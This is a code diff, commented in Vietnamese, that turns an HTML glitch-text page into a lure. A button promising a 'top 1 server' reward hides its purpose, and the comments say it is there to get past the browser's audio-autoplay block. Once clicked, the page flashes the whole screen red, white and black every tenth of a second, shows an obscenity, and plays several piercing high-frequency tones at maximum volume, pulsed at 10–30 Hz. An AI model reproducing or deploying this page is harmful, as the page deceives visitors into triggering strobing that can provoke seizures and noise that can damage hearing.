@@ -19,9 +19,43 @@
             font-family: 'Anton', sans-serif;
         }
 
+        /* Nút mồi để vượt qua cơ chế chặn âm thanh của trình duyệt */
+        #start-btn {
+            position: absolute;
+            z-index: 999;
+            padding: 20px 40px;
+            font-size: 2vw;
+            font-family: 'Anton', sans-serif;
+            background-color: #ff003c;
+            color: #fff;
+            border: 2px solid #fff;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 0 20px #ff003c;
+            animation: pulse-btn 1s infinite alternate;
+            transition: 0.2s;
+        }
+
+        #start-btn:hover {
+            background-color: #fff;
+            color: #ff003c;
+            transform: scale(1.1);
+        }
+
+        @keyframes pulse-btn {
+            0% { box-shadow: 0 0 10px #ff003c; }
+            100% { box-shadow: 0 0 40px #ff003c, 0 0 80px #ff003c; }
+        }
+
+        /* Ẩn chữ chửi lúc đầu */
         .glitch-wrapper {
             position: relative;
             text-align: center;
+            display: none;
+        }
+
+        .active .glitch-wrapper {
+            display: block;
         }
 
         .glitch-text {
@@ -31,7 +65,7 @@
             text-transform: uppercase;
             position: relative;
             text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-            animation: shake 0.5s infinite;
+            animation: shake 0.1s infinite;
         }
 
         .glitch-text::before,
@@ -46,17 +80,28 @@
         }
 
         .glitch-text::before {
-            left: 4px;
-            text-shadow: -2px 0 #ff00c1;
+            left: 8px;
+            text-shadow: -4px 0 #ff00c1;
             clip: rect(44px, 450px, 56px, 0);
-            animation: glitch-anim 5s infinite linear alternate-reverse;
+            animation: glitch-anim 2s infinite linear alternate-reverse;
         }
 
         .glitch-text::after {
-            left: -4px;
-            text-shadow: -2px 0 #00fff9, 2px 2px #ff00c1;
+            left: -8px;
+            text-shadow: -4px 0 #00fff9, 4px 4px #ff00c1;
             clip: rect(44px, 450px, 56px, 0);
-            animation: glitch-anim2 5s infinite linear alternate-reverse;
+            animation: glitch-anim2 2s infinite linear alternate-reverse;
+        }
+
+        /* Hiệu ứng chớp màn hình cực gắt */
+        .active {
+            animation: flash-bg 0.1s infinite;
+        }
+
+        @keyframes flash-bg {
+            0% { background-color: #000; }
+            50% { background-color: #ff0000; }
+            100% { background-color: #fff; }
         }
 
         @keyframes glitch-anim {
@@ -108,20 +153,19 @@
         }
         
         @keyframes shake {
-            0% { transform: translate(1px, 1px) rotate(0deg); }
-            10% { transform: translate(-1px, -2px) rotate(-1deg); }
-            20% { transform: translate(-3px, 0px) rotate(1deg); }
-            30% { transform: translate(3px, 2px) rotate(0deg); }
-            40% { transform: translate(1px, -1px) rotate(1deg); }
-            50% { transform: translate(-1px, 2px) rotate(-1deg); }
-            60% { transform: translate(-3px, 1px) rotate(0deg); }
-            70% { transform: translate(3px, 1px) rotate(-1deg); }
-            80% { transform: translate(-1px, -1px) rotate(1deg); }
-            90% { transform: translate(1px, 2px) rotate(0deg); }
-            100% { transform: translate(1px, -2px) rotate(-1deg); }
+            0% { transform: translate(3px, 3px) rotate(0deg) scale(1); }
+            10% { transform: translate(-3px, -5px) rotate(-3deg) scale(1.1); }
+            20% { transform: translate(-6px, 0px) rotate(3deg) scale(0.9); }
+            30% { transform: translate(6px, 5px) rotate(0deg) scale(1.2); }
+            40% { transform: translate(3px, -3px) rotate(3deg) scale(1); }
+            50% { transform: translate(-3px, 5px) rotate(-3deg) scale(1.1); }
+            60% { transform: translate(-6px, 3px) rotate(0deg) scale(0.9); }
+            70% { transform: translate(6px, 3px) rotate(-3deg) scale(1.2); }
+            80% { transform: translate(-3px, -3px) rotate(3deg) scale(1); }
+            90% { transform: translate(3px, 5px) rotate(0deg) scale(1.1); }
+            100% { transform: translate(3px, -5px) rotate(-3deg) scale(0.9); }
         }
 
-        /* Scanline effect */
         .scanlines {
             position: fixed;
             top: 0;
@@ -132,8 +176,8 @@
                 to bottom,
                 rgba(255,255,255,0),
                 rgba(255,255,255,0) 50%,
-                rgba(0,0,0,0.2) 50%,
-                rgba(0,0,0,0.2)
+                rgba(0,0,0,0.4) 50%,
+                rgba(0,0,0,0.4)
             );
             background-size: 100% 4px;
             pointer-events: none;
@@ -142,9 +186,54 @@
     </style>
 </head>
 <body>
+    <button id="start-btn">NHẤN VÀO ĐỂ NHẬN TOP 1 SERVER</button>
+    
     <div class="scanlines"></div>
     <div class="glitch-wrapper">
         <div class="glitch-text" data-text="CÓ CÁI CON CẶC">CÓ CÁI CON CẶC</div>
     </div>
+
+    <script>
+        // Tạo âm thanh chói tai (Ear Rape) bằng Web Audio API
+        function playEarRape() {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            const ctx = new AudioContext();
+            
+            // Các tần số siêu chói (Square wave & Sawtooth wave)
+            const freqs = [3500, 4200, 8000, 8100, 10000];
+            
+            freqs.forEach(f => {
+                const osc = ctx.createOscillator();
+                osc.type = f > 5000 ? 'square' : 'sawtooth';
+                osc.frequency.value = f;
+                
+                const gain = ctx.createGain();
+                gain.gain.value = 1.0; // Volume max
+                
+                // Tạo hiệu ứng giật (Strobe) cực khó chịu
+                const lfo = ctx.createOscillator();
+                lfo.type = 'square';
+                lfo.frequency.value = Math.random() * 20 + 10; // 10Hz - 30Hz rung
+                
+                const lfoGain = ctx.createGain();
+                lfoGain.gain.value = 1;
+                lfo.connect(gain.gain);
+                lfo.start();
+                
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+            });
+        }
+
+        document.getElementById('start-btn').addEventListener('click', function() {
+            // Ẩn nút
+            this.style.display = 'none';
+            // Kích hoạt hiệu ứng hình ảnh
+            document.body.classList.add('active');
+            // Kích hoạt âm thanh chói tai
+            playEarRape();
+        });
+    </script>
 </body>
 </html>
